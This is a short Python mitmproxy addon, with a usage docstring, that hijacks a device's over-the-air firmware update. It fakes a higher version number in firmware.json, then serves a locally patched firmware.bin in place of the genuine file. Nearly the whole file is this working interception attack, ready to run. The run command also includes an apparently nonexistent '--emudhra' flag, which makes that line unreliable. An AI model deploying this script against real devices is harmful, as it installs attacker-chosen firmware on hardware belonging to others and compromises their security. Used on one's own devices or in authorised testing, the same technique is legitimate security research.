"""mitmproxy addon: serve a modified firmware.bin during OTA update.

Run:
    mitmproxy --emudhra -s mitm_firmware.py
    (or mitmweb / mitmdump)

Flow the device follows:
    1. GET .../v2/firmware/firmware.json   -> bump "version" so the device sees a newer build
    2. GET .../v2/firmware/firmware.bin    -> serve our patched firmware instead of the real one

The OTA updater only downloads firmware.bin when firmware.json's "version" is
newer than the device's current version, so BOTH intercepts are required.
"""
import json
from mitmproxy import http
from mitmproxy import ctx

PATCHED_FIRMWARE = "patched_firmware.bin"   # path to our firmware (relative to cwd, or absolute)
FAKE_VERSION = "9.9.9"                      # must compare > device version (string & numeric)

JSON_PATH = "/v2/firmware/firmware.json"
BIN_PATH = "/v2/firmware/firmware.bin"


class FirmwareSwap:
    def __init__(self):
        self.firmware = open(PATCHED_FIRMWARE, "rb").read()

    def response(self, flow: http.HTTPFlow) -> None:
        path = flow.request.path

        if path.endswith(JSON_PATH):
            try:
                data = json.loads(flow.response.content)
                old = data.get("version")
                data["version"] = FAKE_VERSION
                flow.response.content = json.dumps(data).encode()
                flow.response.headers["Content-Length"] = str(len(flow.response.content))
                ctx_log(f"firmware.json: version {old} -> {FAKE_VERSION}")
            except Exception as e:
                ctx_log(f"firmware.json parse error: {e}")

        elif path.endswith(BIN_PATH):
            flow.response.content = self.firmware
            flow.response.headers["Content-Length"] = str(len(self.firmware))
            ctx_log(f"firmware.bin: served {len(self.firmware)} bytes of patched firmware")


def ctx_log(msg: str) -> None:
    ctx.log.info(f"[FirmwareSwap] {msg}")


addons = [FirmwareSwap()]
